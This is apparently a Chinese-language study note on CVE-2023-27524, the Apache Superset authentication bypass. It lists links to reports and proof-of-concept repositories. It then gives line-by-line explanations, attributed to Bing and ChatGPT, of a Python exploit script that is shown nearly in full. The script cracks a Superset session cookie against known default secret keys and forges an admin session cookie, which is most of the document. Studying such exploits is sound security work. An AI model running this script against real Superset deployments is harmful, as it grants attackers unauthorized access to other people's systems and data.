# 身份认证绕过\_ApacheSuperset_CVE-2023-27524

- [漏洞发现团队 horizon3ai 的报告](https://www.horizon3.ai/cve-2023-27524-insecure-default-configuration-in-apache-superset-leads-to-remote-code-execution/)
- [Freebuf](https://www.freebuf.com/vuls/369911.html)
- [Apache Superset 存在未授权访问漏洞(CVE-2023-27524)详细利用过程](https://blog.csdn.net/nnn2188185/article/details/130478979)
- Github 上的一些 poc
  - [horizon3ai/CVE-2023-27524](https://github.com/horizon3ai/CVE-2023-27524)
  - [Okaytc/Superset_auth_bypass_check](https://github.com/Okaytc/Superset_auth_bypass_check)
  - [TardC/CVE-2023-27524](https://github.com/TardC/CVE-2023-27524)
  - [antx-code/CVE-2023-27524](https://github.com/antx-code/CVE-2023-27524)
  - [Pari-Malam/CVE-2023-27524](https://github.com/Pari-Malam/CVE-2023-27524)
  - [MaanVader/CVE-2023-27524-POC](https://github.com/MaanVader/CVE-2023-27524-POC)

---

TODO: 需要再读读代码

---

bing

您好，这是 Bing。我可以帮您逐行解释一下具体代码的作用。😊

这段代码是用 Python 语言编写的，它使用了 flask_unsign, requests, urllib3, argparse, re, time 等模块，分别用于破解和伪造 session cookie，发送 HTTP 请求，忽略 HTTPS 警告，解析命令行参数，进行正则表达式匹配，控制时间等。这段代码的目的是利用 flask_unsign 模块来破解和伪造 Apache Superset 的 session cookie，从而绕过身份验证，实现远程代码执行的漏洞利用。这段代码是针对 CVE-2023-27524 这个漏洞编写的，该漏洞是由于 Apache Superset 使用了不安全的默认配置而导致的身份验证绕过漏洞 ¹。

具体来说，这段代码的逻辑如下：

```python
# 导入所需的模块
from flask_unsign import session
import requests
import urllib3
import argparse
import re
from time import sleep

# 忽略HTTPS警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 定义一个SECRET_KEYS列表，里面存放了一些可能被Apache Superset使用的默认密钥，用于破解session cookie
SECRET_KEYS = [
    b"\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h",  # version < 1.4.1
    b"CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET",  # version >= 1.4.1
    b"thisISaSECRET_1234",  # deployment template
    b"YOUR_OWN_RANDOM_GENERATED_SECRET_KEY",  # documentation
    b"TEST_NON_DEV_SECRET",  # docker compose
]

# 定义一个main函数，用于执行主要的逻辑
def main():
    # 创建一个命令行参数解析器，用于接收用户输入的参数，包括目标URL(必须) ，用户ID(可选，默认为1) ，是否验证登录(可选，默认为否) ，等待时间(可选，默认为5秒) 等
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--url", "-u", help="Base URL of Superset instance", required=True
    )
    parser.add_argument(
        "--id",
        help="User ID to forge session cookie for, default=1",
        required=False,
        default="1",
    )
    parser.add_argument(
        "--validate", "-v", help="Validate login", required=False, action="store_true"
    )
    parser.add_argument(
        "--timeout",
        "-t",
        help="Time to wait before using forged session cookie, default=5s",
        required=False,
        type=int,
        default=5,
    )
    args = parser.parse_args()

    # 尝试访问目标URL的登录页面，并获取返回的session cookie。如果没有获取到session cookie或者session cookie不是Flask类型的，则打印错误信息并退出。
    try:
        u = args.url.rstrip("/") + "/login/"

        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0"
        }

        resp = requests.get(
            u, headers=headers, verify=False, timeout=30, allow_redirects=False
        )
        if resp.status_code != 200:
            print(
                f"Error retrieving login page at {u}, status code: {resp.status_code}"
            )
            return

        session_cookie = None
        for c in resp.cookies:
            if c.name == "session":
                session_cookie = c.value
                break

        if not session_cookie:
            print("Error: No session cookie found")
            return

        print(f"Got session cookie: {session_cookie}")

        # 尝试解码session cookie，并打印出来。同时，尝试从返回的页面中匹配出Superset的版本号，并打印出来。
        try:
            decoded = session.decode(session_cookie)
            print(f"Decoded session cookie: {decoded}")
        except:
            print("Error: Not a Flask session cookie")
            return

        match = re.search(r"&#34;version_string&#34;: &#34;(.*?)&#34", resp.text)
        if match:
            version = match.group(1)
        else:
            version = "Unknown"

        print(f"Superset Version: {version}")

        # 遍历SECRET_KEYS列表中的每一个密钥，尝试用flask_unsign模块的verify函数来验证session cookie是否可以被破解。如果可以，则打印出成功破解的信息和使用的密钥，并跳出循环。如果不可以，则打印出失败破解的信息并退出。
        for i, k in enumerate(SECRET_KEYS):
            cracked = session.verify(session_cookie, k)
            if cracked:
                break

        if not cracked:
            print("Failed to crack session cookie")
            return

        print(f"Vulnerable to CVE-2023-27524 - Using default SECRET_KEY: {k}")

        # 根据用户输入的ID参数(如果不是整数，则原样使用) ，用flask_unsign模块的sign函数来伪造一个新的session cookie，并打印出来。
        try:
            user_id = int(args.id)
        except:
            user_id = args.id

        forged_cookie = session.sign({"_user_id": user_id, "user_id": user_id}, k)
        print(f"Forged session cookie for user {user_id}: {forged_cookie}")

        # 如果用户输入了验证登录的参数，则尝试使用伪造的session cookie访问目标URL的登录页面，并检查返回的状态码是否为302(表示重定向) 。如果是，则打印出成功验证登录的信息。如果不是，则打印出失败验证登录的信息，并建议重新检查用户ID。如果发生异常，则打印出异常信息。
        if args.validate:
            validated = False
            try:
                headers["Cookie"] = f"session={forged_cookie}"
                print(
                    f"Sleeping {args.timeout} seconds before using forged cookie to account for time drift..."
                )
                sleep(args.timeout)
                resp = requests.get(
                    u, headers=headers, verify=False, timeout=30, allow_redirects=False
                )
                if resp.status_code == 302:
                    print(
                        f"Got 302 on login, forged cookie appears to have been accepted"
                    )
                    validated = True
                else:
                    print(
                        f"Got status code {resp.status_code} on login instead of expected redirect 302. Forged cookie does not appear to be valid. Re-check user id."
                    )
            except Exception as e_inner:
                print(
                    f"Exception occurred while validating login: {e_inner}"
                )
```

希望这些信息对您有帮助。如果您还有其他问题，欢迎继续与我交流。😊

¹: [CVE-2023-27524](^1^)

源: 与必应的对话， 2023/8/18
(1) 看不懂代码？让 AI 来帮你翻译！| Github Copilot Labs - 掘金. https://juejin.cn/post/7081301239593435149.
(2) 看不懂代码？让 AI 来帮你翻译！| Github Copilot Labs - 掘金. https://juejin.cn/post/7081301239593435149.
(3) 看不懂代码怎么办？有没有可以解释代码或者其他方法可以看懂 .... https://www.zhihu.com/question/369988824.
(4) mapreduce 实例代码详解(一行一行的注释)  - CSDN 博客. https://blog.csdn.net/qq_44823756/article/details/111758706.
(5) 深度学习代码有救了！我发现了一个逐行解读代码的网站 .... https://www.bilibili.com/video/BV1M94y1B7qX/.

---

ChatGPT

当然，接下来我们继续解释代码的每一行。

```python
        u = args.url.rstrip("/") + "/login/"

        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0"
        }

        resp = requests.get(
            u, headers=headers, verify=False, timeout=30, allow_redirects=False
        )
        if resp.status_code != 200:
            print(
                f"Error retrieving login page at {u}, status code: {resp.status_code}"
            )
            return
```

这段代码主要用于获取 Superset 登录页面。

- `u = args.url.rstrip("/") + "/login/"`: 构建 Superset 登录页面的 URL，`rstrip("/")` 是为了确保 URL 末尾没有斜杠。

- `headers = { ... }`: 创建一个 HTTP 请求头，模拟一个用户代理为 Mozilla Firefox 的请求。

- `resp = requests.get(u, headers=headers, verify=False, timeout=30, allow_redirects=False)`: 发送一个 GET 请求到构建的 URL，使用定义的请求头。`verify=False` 禁用了 SSL 证书验证，`timeout=30` 设置了请求的超时时间，`allow_redirects=False` 禁止了重定向。

- `if resp.status_code != 200:`: 如果响应的状态码不是 200(即成功) ，则输出错误消息，并中止程序运行。

```python
        session_cookie = None
        for c in resp.cookies:
            if c.name == "session":
                session_cookie = c.value
                break

        if not session_cookie:
            print("Error: No session cookie found")
            return

        print(f"Got session cookie: {session_cookie}")

        try:
            decoded = session.decode(session_cookie)
            print(f"Decoded session cookie: {decoded}")
        except:
            print("Error: Not a Flask session cookie")
            return
```

这部分代码用于提取会话 Cookie 并对其进行解码。

- `session_cookie = None`: 初始化会话 Cookie 变量。

- `for c in resp.cookies: ...`: 遍历响应的 Cookie，找到名为 "session" 的 Cookie，提取其值并存储在 `session_cookie` 变量中。

- `if not session_cookie:`: 如果没有找到会话 Cookie，则输出错误消息，并中止程序运行。

- `print(f"Got session cookie: {session_cookie}")`: 输出获取到的会话 Cookie。

- `try: ...`: 尝试对会话 Cookie 进行解码。

- `decoded = session.decode(session_cookie)`: 使用之前导入的 `flask_unsign` 模块的 `decode` 函数解码会话 Cookie。

- `print(f"Decoded session cookie: {decoded}")`: 输出解码后的会话 Cookie。

- `except: ...`: 如果解码失败，输出错误消息，并中止程序运行。
